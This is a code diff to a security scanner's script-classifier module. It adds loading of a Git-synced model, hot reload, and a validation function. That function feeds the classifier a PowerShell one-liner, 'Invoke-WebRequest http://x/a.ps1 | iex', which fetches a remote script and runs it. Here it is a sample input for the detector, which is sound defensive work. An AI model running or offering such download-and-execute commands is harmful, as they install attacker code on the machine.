@@ -18,6 +18,7 @@ it is a second opinion next to the readable rules in filescan.py, not a replacem
 """
 from __future__ import annotations
 
+import os
 import re
 import sys
 import zlib
@@ -37,7 +38,17 @@ LABEL_TEXT = {
 FEATURES = 8192
 MAX_CHARS = 24000
 HERE = Path(getattr(sys, "_MEIPASS", Path(__file__).resolve().parent))
-MODEL_FILE = HERE / "models" / "script_clf_int8.npz"
+BUNDLED_MODEL = HERE / "models" / "script_clf_int8.npz"
+DATA = Path(os.environ.get("SOC_SCAN_DATA") or Path(__file__).resolve().parents[1] / "data" / "scan")
+SYNCED_MODEL = DATA / "models" / "script_clf_int8.npz"   # written by Git sync
+
+
+def model_file() -> Path:
+    """The synced model if Git sync has delivered one, otherwise the model shipped with the app."""
+    return SYNCED_MODEL if SYNCED_MODEL.exists() else BUNDLED_MODEL
+
+
+MODEL_FILE = BUNDLED_MODEL   # kept for older code that only reads the name
 
 _WORD = re.compile(r"[a-z_][a-z0-9_\-\.]{1,30}")
 
@@ -73,8 +84,8 @@ def featurize(text: str) -> tuple[np.ndarray, np.ndarray]:
 
 
 class Model:
-    def __init__(self, path: Path = MODEL_FILE):
-        z = np.load(path, allow_pickle=False)
+    def __init__(self, path: Optional[Path] = None):
+        z = np.load(path or model_file(), allow_pickle=False)
         self.w1 = z["w1"]          # int8  (FEATURES, H)
         self.s1 = z["s1"]          # float32 (H,)   scale per column
         self.b1 = z["b1"]
@@ -116,3 +127,15 @@ def classify(text: str) -> Optional[dict]:
             _failed = True
             return None
     return _model.predict(text)
+
+
+def check_file(path: Path) -> None:
+    """Raise an error if this file is not a usable int8 model. Git sync calls it BEFORE swapping."""
+    Model(path).predict("Invoke-WebRequest http://x/a.ps1 | iex")
+
+
+def reload() -> None:
+    """Forget the loaded model so the next call loads the current file (hot swap)."""
+    global _model, _failed
+    _model = None
+    _failed = False
